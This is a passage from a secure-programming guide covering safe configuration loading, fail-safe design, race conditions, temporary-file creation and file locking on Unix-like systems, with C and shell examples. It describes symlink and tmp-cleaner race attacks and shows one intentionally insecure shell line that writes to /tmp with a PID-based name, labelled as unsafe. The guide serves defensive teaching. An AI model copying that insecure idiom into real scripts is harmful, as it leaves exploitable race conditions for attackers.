Make using the <SPAN
CLASS="QUOTE"
>&#8220;secure&#8221;</SPAN
> approach as easy as possible, or many users
will use an insecure approach without understanding the risks.
On Linux,
take advantage of tools like linuxconf, so that users can easily configure
their system using an existing infrastructure.</P
><P
>If there&#8217;s a configuration language, the default should be to deny access
until the user specifically grants it.
Include many clear comments in the sample configuration file, if there is one,
so the administrator understands what the configuration does.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="INIT-SAFE"
>7.8. Load Initialization Values Safely</A
></H2
><P
>Many programs read an initialization file to allow their defaults to be
configured.
You must ensure that an attacker can&#8217;t change which initialization file
is used, nor create or modify that file.
Often you should <EM
>not</EM
> use the current directory
as a source of this information, since if the program is used as an
editor or browser, the user may be viewing the directory controlled
by someone else.
Instead, if the program is a typical user application, you should load
any user defaults from a hidden file or directory contained in the user&#8217;s
home directory.
If the program is setuid/setgid, don&#8217;t read any file controlled by the
user unless you carefully filter it as an untrusted (potentially
hostile) input.
Trusted configuration values should be loaded from somewhere else
entirely (typically from a file in /etc).</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="MINIMIZE-DATA-ACCESS"
>7.9. Minimize the Accessible Data</A
></H2
><P
>A highly related issue is that, by default, data should be
minimally accessible.
Make sure any configuration and data files have the minimum necessary
privileges.
Obviously, make sure that only authorized users can write to these files.
In fact, it may be wise to check the permissions on the files, and stop
processing if arbitrary users can write to configuration files (or
arbitrarily modify the directories they&#8217;re in).
It&#8217;s often wise to install configuration files so that ordinary users
can&#8217;t read them as well.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="FAIL-SAFE"
>7.10. Fail Safe</A
></H2
><P
>A secure program should always <SPAN
CLASS="QUOTE"
>&#8220;fail safe&#8221;</SPAN
>, that is,
it should be designed so that if the program does fail, the safest
result should occur.
For security-critical programs, that usually means that
if some sort of misbehavior is detected (malformed input,
reaching a <SPAN
CLASS="QUOTE"
>&#8220;can&#8217;t get here&#8221;</SPAN
> state, and so on), then the program
should immediately deny service and stop processing that request.
Don&#8217;t try to <SPAN
CLASS="QUOTE"
>&#8220;figure out what the user wanted&#8221;</SPAN
>: just deny the service.
Sometimes this can decrease reliability or useability
(from a user&#8217;s perspective), but it increases security.
There are a few cases where this might not be desired (e.g., where denial of
service is much worse than loss of confidentiality or integrity), but
such cases are quite rare.</P
><P
>Note that I recommend <SPAN
CLASS="QUOTE"
>&#8220;stop processing the request&#8221;</SPAN
>, not <SPAN
CLASS="QUOTE"
>&#8220;fail altogether&#8221;</SPAN
>.
In particular, most servers should not completely halt when given malformed
input, because that creates a trivial opportunity for a denial of service
attack (the attacker just sends garbage bits to prevent you from using the
service).
Sometimes taking the whole server down is necessary, in particular,
reaching some <SPAN
CLASS="QUOTE"
>&#8220;can&#8217;t get here&#8221;</SPAN
>
states may signal a problem so drastic
that continuing is unwise.</P
><P
>Consider carefully what error message you send back when a failure is detected.
if you send nothing
back, it may be hard to diagnose problems, but sending back too much
information may unintentionally aid an attacker.
Usually the best approach is to reply with <SPAN
CLASS="QUOTE"
>&#8220;access denied&#8221;</SPAN
> or
<SPAN
CLASS="QUOTE"
>&#8220;miscellaneous error encountered&#8221;</SPAN
> and then
write more detailed information to an audit log (where you can have more
control over who sees the information).</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="AVOID-RACE"
>7.11. Avoid Race Conditions</A
></H2
><P
>A <SPAN
CLASS="QUOTE"
>&#8220;race condition&#8221;</SPAN
> can be defined as
<SPAN
CLASS="QUOTE"
>&#8220;Anomalous behavior due to unexpected critical dependence
on the relative timing of events&#8221;</SPAN
>
[FOLDOC].
Race conditions generally involve one or more processes
accessing a shared resource (such a file or variable), where this
multiple access has not been properly controlled.</P
><P
>In general, processes do not execute atomically;
another process may interrupt it between essentially any two instructions.
If a secure program&#8217;s process is not prepared for these interruptions,
another process may be able to interfere with the secure program&#8217;s process.
Any pair of operations in a secure program must still work correctly
if arbitrary amounts of another process&#8217;s code is executed between them. </P
><P
>Race condition problems can be notionally divided into two categories:
<P
></P
><UL
><LI
><P
>Interference caused by untrusted processes.
Some security taxonomies call this problem a
<SPAN
CLASS="QUOTE"
>&#8220;sequence&#8221;</SPAN
> or <SPAN
CLASS="QUOTE"
>&#8220;non-atomic&#8221;</SPAN
> condition.
These are conditions caused by processes running other, different programs,
which <SPAN
CLASS="QUOTE"
>&#8220;slip in&#8221;</SPAN
> other actions between steps of the secure program.
These other programs might be invoked by an attacker specifically
to cause the problem.
This book will call these sequencing problems.</P
></LI
><LI
><P
>Interference caused by trusted processes (from the secure program&#8217;s
point of view).
Some taxonomies call these deadlock, livelock, or locking failure conditions.
These are conditions caused by processes running the <SPAN
CLASS="QUOTE"
>&#8220;same&#8221;</SPAN
> program.
Since these different processes may have the <SPAN
CLASS="QUOTE"
>&#8220;same&#8221;</SPAN
> privileges, if
not properly controlled they may be able to interfere with each other in
a way other programs can&#8217;t.
Sometimes this kind of interference can be exploited.
This book will call these locking problems.</P
></LI
></UL
></P
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="NON-ATOMIC"
>7.11.1. Sequencing (Non-Atomic) Problems</A
></H3
><P
>In general,
you must check your code for any pair of operations that might fail if
arbitrary code is executed between them. </P
><P
>Note that loading and saving a shared variable are usually implemented
as separate operations and are not atomic.
This means that an <SPAN
CLASS="QUOTE"
>&#8220;increment variable&#8221;</SPAN
> operation is usually converted into
loading, incrementing, and saving operation, so if the variable memory
is shared the other process may interfere with the incrementing.</P
><P
>Secure programs must determine if a request should be granted, and if
so, act on that request.
There must be no way for an untrusted user to change anything used in
this determination before the program acts on it.
This kind of race condition is sometimes termed a
<EM
>time of check - time of use</EM
> (TOCTOU) race condition.</P
><DIV
CLASS="SECT3"
><HR><H4
CLASS="SECT3"
><A
NAME="ATOMIC-FILESYSTEM"
>7.11.1.1. Atomic Actions in the Filesystem</A
></H4
><P
>The problem of failing to perform atomic actions
repeatedly comes up in the filesystem.
In general, the filesystem is a shared resource used by many programs,
and some programs may interfere with its use by other programs.
Secure programs should generally avoid using access(2) to determine
if a request should be granted, followed later by open(2), because users
may be able to move files around between these calls, possibly creating
symbolic links or files of their own choosing instead.
A secure program should instead set its effective id or filesystem id,
then make the open call directly.
It&#8217;s possible to use access(2) securely, but only when a user cannot affect
the file or any directory along its path from the filesystem root.</P
><P
>When creating a file, you should
open it using the modes O_CREAT | O_EXCL and grant only
very narrow permissions (only to the current user);
you&#8217;ll also need to prepare for having the open fail.
If you need to be able to open the file (e.g,. to prevent a
denial-of-service), you&#8217;ll need to repetitively
(1) create a <SPAN
CLASS="QUOTE"
>&#8220;random&#8221;</SPAN
> filename, (2) open the file as noted,
and (3) stop repeating when the open succeeds.</P
><P
>Ordinary programs can become security weaknesses if they
don&#8217;t create files properly.
For example, the <SPAN
CLASS="QUOTE"
>&#8220;joe&#8221;</SPAN
> text editor had a weakness called the
<SPAN
CLASS="QUOTE"
>&#8220;DEADJOE&#8221;</SPAN
> symlink vulnerability.
When joe was exited in a nonstandard way (such as a system crash, closing an
xterm, or a network connection going down), joe would unconditionally append
its open buffers to the file "DEADJOE".
This could be exploited by the
creation of DEADJOE symlinks in directories where root would normally use joe.
In this way, joe could be used to append garbage to
potentially-sensitive files, resulting in a denial of service and/or
unintentional access.</P
><P
>As another example, when performing a series of operations on a file&#8217;s
meta-information (such as changing its owner, stat-ing the file, or
changing its permission bits), first open the file and then use the
operations on open files.
This means use the fchown( ), fstat( ), or fchmod( ) system calls,
instead of the functions taking filenames
such as chown(), chgrp(), and chmod().
Doing so will prevent the file from being
replaced while your program is running (a possible race condition).
For example, if you close a file and then use chmod()
to change its permissions,
an attacker may be able to move or remove the file between those
two steps and create a symbolic link to another file
(say /etc/passwd).
Other interesting files include /dev/zero, which can
provide an infinitely-long data stream of input to a program; if an
attacker can <SPAN
CLASS="QUOTE"
>&#8220;switch&#8221;</SPAN
> the file midstream, the results can be dangerous.</P
><P
>But even this gets complicated - when creating files, you must give
them as a minimal set of rights as possible, and then change the
rights to be more expansive if you desire.
Generally, this means you need to use umask and/or open&#8217;s parameters to
limit initial access to just the user and user group.
For example, if you create a file that is initially world-readable, then
try to turn off the <SPAN
CLASS="QUOTE"
>&#8220;world readable&#8221;</SPAN
> bit, an attacker could try to
open the file while the permission bits said this was okay.
On most Unix-like systems, permissions are only checked on open, so
this would result in an attacker having more privileges than intended.</P
><P
>In general, if multiple users can write to a directory in a Unix-like
system, you'd better have the <SPAN
CLASS="QUOTE"
>&#8220;sticky&#8221;</SPAN
> bit set on that directory,
and sticky directories had better be implemented.
It&#8217;s much better to completely avoid the problem, however, and create
directories that only a trusted special process can access
(and then implement that carefully).
The traditional Unix temporary directories (/tmp and /var/tmp) are usually
implemented as <SPAN
CLASS="QUOTE"
>&#8220;sticky&#8221;</SPAN
> directories, and all sorts of security problems
can still surface, as we&#8217;ll see next.</P
></DIV
><DIV
CLASS="SECT3"
><HR><H4
CLASS="SECT3"
><A
NAME="TEMPORARY-FILES"
>7.11.1.2. Temporary Files</A
></H4
><P
>This issue of correctly performing atomic operations
particularly comes up when creating temporary files.
Temporary files in Unix-like systems are traditionally
created in the /tmp or /var/tmp directories,
which are shared by all users.
A common trick by attackers is to create symbolic links in the
temporary directory to some other file (e.g., /etc/passwd)
while your secure program is running.
The attacker&#8217;s goal is to create
a situation where the secure program determines that
a given filename doesn&#8217;t exist, the attacker then creates the symbolic
link to another file, and then the secure program performs some operation
(but now it actually opened an unintended file).
Often important files can be clobbered or modified this way.
There are many variations to this attack, such as creating normal files,
all based on the
idea that the attacker can create (or sometimes
otherwise access) file system objects
in the same directory used by the secure program for temporary files.</P
><P
>Michal Zalewski exposed in 2002 another serious problem with
temporary directories involving automatic cleaning of temporary directories.
For more information, see his
posting to Bugtraq dated December 20, 2002, 
(subject "[RAZOR] Problems with mkstemp()").
Basically, Zalewski notes that
it&#8217;s a common practice to have a program automatically sweep
temporary directories like /tmp and /var/tmp and remove "old" files
that have not been accessed for a while (e.g., several days).
Such programs are sometimes called "tmp cleaners" (pronounced "temp cleaners").
Possibly the most common tmp cleaner is "tmpwatch" by
Erik Troan and Preston Brown of Red Hat Software;
another common one is <SPAN
CLASS="QUOTE"
>&#8220;stmpclean&#8221;</SPAN
> by Stanislav Shalunov;
many administrators roll their own as well.
Unfortunately, the existance of tmp cleaners creates an opportunity
for new security-critical race conditions;
an attacker may be able to arrange things so that the tmp cleaner
interferes with the secure program.
For example, an attacker could create an "old" file, arrange for
the tmp cleaner to plan to delete the file, delete the file himself,
and run a secure program that creates the same file - now the tmp cleaner
will delete the secure program&#8217;s file!
Or, imagine that a secure program can have long delays after using the file
(e.g., a setuid program stopped with SIGSTOP and
resumed after many days with SIGCONT, or simply intentionally creating
a lot of work).
If the temporary file isn&#8217;t used for long enough,
its temporary files are likely to be
removed by the tmp cleaner.</P
><P
>The general problem when creating files in these shared directories is that
you must guarantee that the filename you plan to use doesn&#8217;t already
exist at time of creation, and atomically create the file.
Checking <SPAN
CLASS="QUOTE"
>&#8220;before&#8221;</SPAN
> you create the file doesn&#8217;t work, because after the check
occurs, but before creation, another process can create that file with
that filename.
Using an <SPAN
CLASS="QUOTE"
>&#8220;unpredictable&#8221;</SPAN
> or <SPAN
CLASS="QUOTE"
>&#8220;unique&#8221;</SPAN
> filename doesn&#8217;t work in
general, because another process can often repeatedly guess until it succeeds.
Once you create the file atomically, you must alway use the returned
file descriptor
(or file stream, if created from the file descriptor using routines
like fdopen()).
You must never re-open the file, or use any operations that use the
filename as a parameter - always use the file descriptor or
associated stream.
Otherwise, the tmpwatch race issues noted above will cause problems.
You can&#8217;t even create the file, close it, and re-open it, even if the
permissions limit who can open it.
Note that comparing the descriptor and a reopened file to verify inode
numbers, creation times or file ownership is not sufficient - please refer
to "Symlinks and Cryogenic Sleep" by Olaf Kirch.</P
><P
>Fundamentally, to create a temporary file in a shared (sticky) directory,
you must repetitively: (1) create a <SPAN
CLASS="QUOTE"
>&#8220;random&#8221;</SPAN
> filename, (2) open it using 
O_CREAT | O_EXCL and very narrow permissions (which atomically creates the
file and fails if it&#8217;s not created),
and (3) stop repeating when the open succeeds.</P
><P
>According to the 1997 <SPAN
CLASS="QUOTE"
>&#8220;Single Unix Specification&#8221;</SPAN
>, the preferred
method for creating an arbitrary temporary file
(using the C interface) is tmpfile(3).
The tmpfile(3) function creates a temporary file
and opens a corresponding stream, returning that stream (or NULL if it didn&#8217;t).
Unfortunately, the specification doesn&#8217;t make any
guarantees that the file will be created securely.
In earlier versions of this book, I stated that I was concerned because
I could not assure myself that all implementations do this securely.
I&#8217;ve since found that older System V systems
have an insecure implementation of tmpfile(3) (as well as insecure
implementations of tmpnam(3) and tempnam(3)), so on at least some systems
it&#8217;s absolutely useless.
Library implementations of tmpfile(3) should securely create such files,
of course, but users don&#8217;t always realize that their system libraries
have this security flaw, and sometimes they can&#8217;t do anything about it.</P
><P
>Kris Kennaway recommends using mkstemp(3) for making temporary files
in general.
His rationale is that you should use well-known library functions to perform
this task instead of rolling your own functions, and that this function
has well-known semantics.
This is certainly a reasonable position.
I would add that, if you use mkstemp(3), be sure to use umask(2) to limit
the resulting temporary file permissions to only the owner.
This is because
some implementations of mkstemp(3) (basically older ones) make such
files readable and writable by all,
creating a condition in which an attacker can read or
write private data in this directory.
A minor nuisance is that mkstemp(3) doesn&#8217;t directly support the
environment variables TMP or TMPDIR (as discussed below), so
if you want to support them you have to add code to do so.
Here&#8217;s a program in C that demonstrates how to use mkstemp(3)
for this purpose, both directly and when adding support for TMP and TMPDIR:

<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>#include &#60;stdio.h&#62;
#include &#60;stdlib.h&#62;
#include &#60;sys/types.h&#62;
#include &#60;sys/stat.h&#62;

void failure(msg) {
 fprintf(stderr, "%s\n", msg);
 exit(1);
}

/*
 * Given a "pattern" for a temporary filename
 * (starting with the directory location and ending in XXXXXX),
 * create the file and return it.
 * This routines unlinks the file, so normally it won&#38;rsquo;t appear in
 * a directory listing.
 * The pattern will be changed to show the final filename.
 */

FILE *create_tempfile(char *temp_filename_pattern)
{
 int temp_fd;
 mode_t old_mode;
 FILE *temp_file;

 old_mode = umask(077);  /* Create file with restrictive permissions */
 temp_fd = mkstemp(temp_filename_pattern);
 (void) umask(old_mode);
 if (temp_fd == -1) {
   failure("Couldn&#38;rsquo;t open temporary file");
 }
 if (!(temp_file = fdopen(temp_fd, "w+b"))) {
   failure("Couldn&#38;rsquo;t create temporary file&#38;rsquo;s file descriptor");
 }
 if (unlink(temp_filename_pattern) == -1) {
   failure("Couldn&#38;rsquo;t unlink temporary file");
 }
 return temp_file;
}


/*
 * Given a "tag" (a relative filename ending in XXXXXX),
 * create a temporary file using the tag.  The file will be created
 * in the directory specified in the environment variables
 * TMPDIR or TMP, if defined and we aren&#38;rsquo;t setuid/setgid, otherwise
 * it will be created in /tmp.  Note that root (and su'd to root)
 * _will_ use TMPDIR or TMP, if defined.
 * 
 */
FILE *smart_create_tempfile(char *tag)
{
 char *tmpdir = NULL;
 char *pattern;
 FILE *result;

 if ((getuid()==geteuid()) &#38;&#38; (getgid()==getegid())) {
   if (! ((tmpdir=getenv("TMPDIR")))) {
     tmpdir=getenv("TMP");
   }
 }
 if (!tmpdir) {tmpdir = "/tmp";}

 pattern = malloc(strlen(tmpdir)+strlen(tag)+2);
 if (!pattern) {
   failure("Could not malloc tempfile pattern");
 }
 strcpy(pattern, tmpdir);
 strcat(pattern, "/");
 strcat(pattern, tag);
 result = create_tempfile(pattern);
 free(pattern);
 return result;
}



main() {
 int c;
 FILE *demo_temp_file1;
 FILE *demo_temp_file2;
 char demo_temp_filename1[] = "/tmp/demoXXXXXX";
 char demo_temp_filename2[] = "second-demoXXXXXX";

 demo_temp_file1 = create_tempfile(demo_temp_filename1);
 demo_temp_file2 = smart_create_tempfile(demo_temp_filename2);
 fprintf(demo_temp_file2, "This is a test.\n");
 printf("Printing temporary file contents:\n");
 rewind(demo_temp_file2);
 while (  (c=fgetc(demo_temp_file2)) != EOF) {
   putchar(c);
 }
 putchar('\n');
 printf("Exiting; you&#38;rsquo;ll notice that there are no temporary files on exit.\n");
}</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>Kennaway states that if you can&#8217;t use mkstemp(3),
then make yourself a directory using mkdtemp(3), which is protected
from the outside world.
However, as Michal Zalewski notes, this is a bad idea if there are
tmp cleaners in use; instead, use a directory inside the user&#8217;s HOME.
Finally, if you really have to use the insecure mktemp(3), use lots of
X&#8217;s - he suggests 10 (if your libc allows it) so that the filename can&#8217;t
easily be guessed (using only 6 X&#8217;s means that 5 are taken up by the
PID, leaving only one random character and allowing an attacker to
mount an easy race condition).
Note that this is fundamentally insecure, so you should normally not do this.
I add that you should avoid tmpnam(3) as well -
some of its uses aren&#8217;t reliable when threads are present, and
it doesn&#8217;t guarantee that it will work correctly after
TMP_MAX uses (yet most practical uses must be inside a loop).</P
><P
>In general, you should avoid using the insecure functions
such as mktemp(3) or tmpnam(3), unless you take specific measures to
counter their insecurities or test for a secure library implementation
as part of your installation routines.
If you ever want to make a file in /tmp or a world-writable directory
(or group-writable, if you don&#8217;t trust the group) and don&#8217;t want to
use mk*temp() (e.g. you intend for the file to be predictably named),
then <EM
>always</EM
> use the O_CREAT and O_EXCL flags to
open() and <EM
>check the return value</EM
>.
If you fail the open() call, then recover gracefully (e.g. exit).</P
><P
>The GNOME programming guidelines recommend the following C code when
creating filesystem objects in shared (temporary) directories
to securely open temporary files [Quintero 2000]:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> char *filename;
 int fd;

 do {
   filename = tempnam (NULL, "foo");
   fd = open (filename, O_CREAT | O_EXCL | O_TRUNC | O_RDWR, 0600);
   free (filename);
 } while (fd == -1);</PRE
></FONT
></TD
></TR
></TABLE
>
Note that, although the insecure function tempnam(3) is being used, it
is wrapped inside a loop using O_CREAT and O_EXCL to counteract its
security weaknesses, so this use is okay.
Note that you need to free() the filename.
You should close() and unlink() the file after you are done.
If you want to use the Standard C I/O library,
you can use fdopen() with mode "w+b"
to transform the file descriptor into a FILE *.
Note that this approach won&#8217;t work over
NFS version 2 (v2) systems, because older
NFS doesn&#8217;t correctly support O_EXCL.
Note that one minor disadvantage to this approach is that, since
tempnam can be used insecurely, various compilers and security scanners
may give you spurious warnings about its use.
This isn&#8217;t a problem with mkstemp(3).</P
><P
>If you need a temporary file in a shell script, you&#8217;re probably
best off using pipes, using a local directory (e.g., something inside the
user&#8217;s home directory), or in some cases using the current directory.
That way, there&#8217;s no sharing unless the user permits it.
If you really want/need the temporary file
to be in a shared directory like /tmp, do
<EM
>not</EM
> use the traditional shell
technique of using the process id in a template and just creating the file
using normal operations like "&#62;".
Shell scripts can use "$$" to indicate the PID, but the
PID can be easily determined or guessed by an attacker,
who can then pre-create files or links with the same name.
Thus the following "typical" shell script is <EM
>unsafe</EM
>:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>   echo "This is a test" &#62; /tmp/test$$  # DON'T DO THIS.</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>If you need a temporary file or directory
in a shell script, and you want it in /tmp,
a solution sometimes suggested is to use
mktemp(1), which is intended for use in shell scripts
(note that mktemp(1) and mktemp(3) are different things).
However, as Michal Zalewski notes, this is insecure in many environments
that run tmp cleaners;
the problem is that when a privileged program sweeps through a temporary
directory, it will probably expose a race condition.
Even if this weren&#8217;t true, I do not recommend using shell scripts that
create temporary files in shared directories;
creating such files in private directories or using pipes instead is
generally preferable, even if you&#8217;re sure your tmpwatch program is okay
(or that you have no local users).
If you must use mktemp(1), note that
mktemp(1) takes a template, then
creates a file or directory using O_EXCL and returns the resulting name;
thus, mktemp(1) won&#8217;t work on NFS version 2 filesystems.
Here are some examples of correct use of mktemp(1) in Bourne shell scripts;
these examples are straight from the mktemp(1) man page:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> # Simple use of mktemp(1), where the script should quit
 # if it can&#38;rsquo;t get a safe temporary file.
 # Note that this will be INSECURE on many systems, since they use
 # tmpwatch-like programs that will erase "old" files and expose race
 # conditions.

   TMPFILE=`mktemp /tmp/$0.XXXXXX` || exit 1
   echo "program output" &#62;&#62; $TMPFILE

  # Simple example, if you want to catch the error:

   TMPFILE=`mktemp -q /tmp/$0.XXXXXX`
   if [ $? -ne 0 ]; then
      echo "$0: Can&#38;rsquo;t create temp file, exiting..."
      exit 1
   fi</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>Perl programmers should use File::Temp, which tries to
provide a cross-platform means of securely creating temporary files.
However, read the documentation carefully on how to use it properly first;
it includes interfaces to unsafe functions as well.
I suggest explicitly setting its safe_level to HIGH; this will invoke
additional security checks.
<A
HREF="http://search.cpan.org/author/JHI/perl-5.8.0/lib/File/Temp.pm"
TARGET="_top"
>The Perl 5.8 documentation of File::Temp is available on-line</A
>.</P
><P
>Don&#8217;t reuse a temporary filename (i.e. remove and recreate it),
no matter how you obtained the <SPAN
CLASS="QUOTE"
>&#8220;secure&#8221;</SPAN
> temporary filename in the
first place.
An attacker can observe the original filename
and hijack it before you recreate it the second time.
And of course, always use appropriate file permissions.
For example, only allow world/group access
if you need the world or a group to access the file, otherwise
keep it mode 0600 (i.e., only the owner can read or write it).</P
><P
>Clean up after yourself, either by using an exit handler, or making
use of UNIX filesystem semantics and unlink()ing the file immediately
after creation so the directory entry goes away but the file itself
remains accessible until the last file descriptor pointing to it is
closed. You can then continue to access it within your program by
passing around the file descriptor.
Unlinking the file has a lot of advantages for code maintenance:
the file is automatically deleted, no matter how your program crashes.
It also decreases the likelihood that a maintainer will insecurely
use the filename (they need to use the file descriptor instead).
The one minor problem with immediate unlinking is that it makes it slightly
harder for administrators to see how disk space is being used, since
they can&#8217;t simply look at the file system by name.</P
><P
>You might consider ensuring that your code for Unix-like systems
respects the environment variables TMP or TMPDIR
if the provider of these variable values is trusted.
By doing so, you make it possible for users to move their temporary
files into an unshared directory (and eliminating the problems discussed here),
such as a subdirectory inside their home directory.
Recent versions of Bastille can set these variables to reduce the sharing
between users.
Unfortunately, many users set TMP or TMPDIR to a shared directory
(say /tmp), so your secure program must still
correctly create temporary files even if these environment variables
are set.
This is one advantage of the GNOME approach, since at least on some
systems tempnam(3) automatically uses TMPDIR, while
the mkstemp(3) approach requires more code to do this.
Please don&#8217;t create yet more environment variables for temporary directories
(such as TEMP), and in particular don&#8217;t create a different environment
name for each application (e.g., don&#8217;t use "MYAPP_TEMP").
Doing so greatly complicates managing systems,
and users wanting a special temporary directory for a specific
application can just set the environment variable specially
when running that particular application.
Of course, if these environment variables might have been set by an
untrusted source, you should ignore them - which you&#8217;ll do anyway
if you follow the advice in
<A
HREF="#ENV-VAR-SOLUTION"
>Section 5.4.3</A
>.</P
><P
>These techniques don&#8217;t work if the temporary directory is remotely
mounted using NFS version 2 (NFSv2), because NFSv2 doesn&#8217;t properly
support O_EXCL.
See <A
HREF="#LOCKING-USING-FILES"
>Section 7.11.2.1</A
> for more information.
NFS version 3 and later properly support O_EXCL; the simple solution
is to ensure that temporary directories are either local or, if mounted
using NFS, mounted using NFS version 3 or later.
There is a technique for safely creating temporary files on NFS v2,
involving the use of link(2) and stat(2), but it&#8217;s complex; see
<A
HREF="#LOCKING-USING-FILES"
>Section 7.11.2.1</A
> which has more information about this.</P
><P
>As an aside, it&#8217;s worth noting that
FreeBSD has recently changed the mk*temp() family to get rid of
the PID component of the filename and replace the entire thing with
base-62 encoded randomness. This drastically raises the number of
possible temporary files for the "default" usage of 6 X's, meaning
that even mktemp(3) with 6 X&#8217;s is reasonably (probabilistically) secure
against guessing, except under very frequent usage.
However, if you also follow the guidance here, you&#8217;ll eliminate the
problem they&#8217;re addressing.</P
><P
>Much of this information on temporary files was derived from
<A
HREF="http://lwn.net/2000/1221/a/sec-tmp.php3"
TARGET="_top"
>Kris Kennaway&#8217;s
posting to Bugtraq about temporary files on December 15, 2000</A
>.</P
><P
>I should note that the Openwall Linux patch from
<A
HREF="http://www.openwall.com/linux/"
TARGET="_top"
>http://www.openwall.com/linux/</A
>
includes an optional <SPAN
CLASS="QUOTE"
>&#8220;temporary file directory&#8221;</SPAN
> policy that counters
many temporary file based attacks.
The Linux Security Module (LSM) project includes an "owlsm" module
that implements some of the OpenWall ideas, so
Linux Kernels with LSM can quickly insert these rules into a running system.
When enabled, it has two protections:
<P
></P
><UL
><LI
><P
>Hard links: Processes may not make hard links to files in certain cases.
The OpenWall documentation states that
<SPAN
CLASS="QUOTE"
>&#8220;Processes may not make hard links to files they do not have write access to.&#8221;</SPAN
>
In the LSM version, the rules are as follows:
if both the process' uid and fsuid (usually the same as the euid) is
is different from the linked-to-file&#8217;s uid, the
process uid is not root, and the process lacks the FOWNER capability, then
the hard link is forbidden.
The check against the process uid may be dropped someday
(they are work-arounds for the atd(8) program), at which point the rules
would be:
if both the process&#8217; fsuid (usually the same as the euid) is
is different from the linked-to-file&#8217;s uid and
and the process lacks the FOWNER capability, then the hard link is forbidden.
In other words, you can only create hard links to files you own,
unless you have the FOWNER capability.&#13;</P
></LI
><LI
><P
>Symbolic links (symlinks): Certain symlinks are not followed.
The original OpenWall documentation states that
<SPAN
CLASS="QUOTE"
>&#8220;root processes may not follow symlinks that
are not owned by root&#8221;</SPAN
>, but the actual rules (from looking at the code)
are more complicated.
In the LSM version, if the directory is sticky ("+t" mode, used in shared
directories like /tmp), symlinks are not followed if the symlink was
created by anyone other than either the owner of the directory or
the current process&#8217; fsuid (which is usually the effective uid).</P
></LI
></UL
>
Many systems do not implement this openwall policy, so you can&#8217;t depend on
this in general protecting your system.
However, I encourage using this policy on your own system, and
please make sure that your application will work when this policy is in place.</P
></DIV
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="LOCKING"
>7.11.2. Locking</A
></H3
><P
>There are often situations in which a program must ensure that it has
exclusive rights to something (e.g., a file, a device, and/or
existence of a particular server process).
Any system which locks resources must deal with the standard problems
of locks, namely, deadlocks (<SPAN
CLASS="QUOTE"
>&#8220;deadly embraces&#8221;</SPAN
>), livelocks,
and releasing <SPAN
CLASS="QUOTE"
>&#8220;stuck&#8221;</SPAN
> locks if a program doesn&#8217;t clean up its locks.
A deadlock can occur if programs are stuck waiting for each other to
release resources.
For example, a deadlock would occur if
process 1 locks resources A and waits for resource B,
while process 2 locks resource B and waits for resource A.
Many deadlocks can be prevented by simply requiring all processes
that lock multiple resources to lock them
in the same order (e.g., alphabetically by lock name).</P
><DIV
CLASS="SECT3"
><HR><H4
CLASS="SECT3"
><A
NAME="LOCKING-USING-FILES"
>7.11.2.1. Using Files as Locks</A
></H4
><P
>On Unix-like systems resource locking has traditionally been done by creating
a file to indicate a lock, because this is very portable.
It also makes it easy to <SPAN
CLASS="QUOTE"
>&#8220;fix&#8221;</SPAN
> stuck locks, because an administrator
can just look at the filesystem to see what locks have been set.
Stuck locks can occur because the program failed to clean up after
itself (e.g., it crashed or malfunctioned) or because the whole system crashed.
Note that these are <SPAN
CLASS="QUOTE"
>&#8220;advisory&#8221;</SPAN
> (not <SPAN
CLASS="QUOTE"
>&#8220;mandatory&#8221;</SPAN
>) locks - all processes
needed the resource must cooperate to use these locks.</P
><P
>However, there are several traps to avoid.
First, don&#8217;t use the technique used by
very old Unix C programs,
which is calling creat() or its open() equivalent, the open() mode
O_WRONLY | O_CREAT | O_TRUNC, with the file mode set to 0 (no permissions).
For normal users on normal file systems, this works, but
this approach fails to lock the file when the user has root privileges.
Root can always perform this operation, even when the file
already exists.
In fact, old versions of Unix had this particular problem in the
old editor <SPAN
CLASS="QUOTE"
>&#8220;ed&#8221;</SPAN
> -- the symptom was that
occasionally portions of the password file would be placed in user&#8217;s files
[Rochkind 1985, 22]!
Instead, if you&#8217;re creating a lock for processes that are on the local
filesystem, you should use open() with the flags
O_WRONLY | O_CREAT | O_EXCL (and again, no permissions, so that other
processes with the same owner won&#8217;t get the lock).
Note the use of O_EXCL, which is the official way to
create <SPAN
CLASS="QUOTE"
>&#8220;exclusive&#8221;</SPAN
> files; this even works for root on a local filesystem.
[Rochkind 1985, 27].</P
><P
>Second, if the lock file may be on an NFS-mounted filesystem, then you have
the problem that NFS version 2 doesn&#8217;t completely support normal file semantics.
This can even be a problem for work that&#8217;s supposed to be <SPAN
CLASS="QUOTE"
>&#8220;local&#8221;</SPAN
> to a
client, since some clients don&#8217;t have local disks and may have <EM
>all</EM
>
files remotely mounted via NFS.
The manual for <EM
>open(2)</EM
> explains how to handle things in this case
(which also handles the case of root programs):</P
><P
><SPAN
CLASS="QUOTE"
>&#8220;... programs which rely on
[the O_CREAT and O_EXCL flags of open(2) to work on
filesystems accessed via NFS version 2]
for performing locking tasks will contain a race condition. The solution
for performing atomic file locking using a lockfile is to create
a unique file on the same filesystem (e.g., incorporating
hostname and pid), use link(2) to make a link to
the lockfile and use stat(2) on the unique file to
check if its link count has increased to 2. Do
not use the return value of the link(2) call.&#8221;</SPAN
></P
><P
>Obviously, this solution only works if all programs doing the locking
are cooperating, and if all non-cooperating programs aren&#8217;t allowed to
interfere.
In particular, the directories you&#8217;re using for file locking
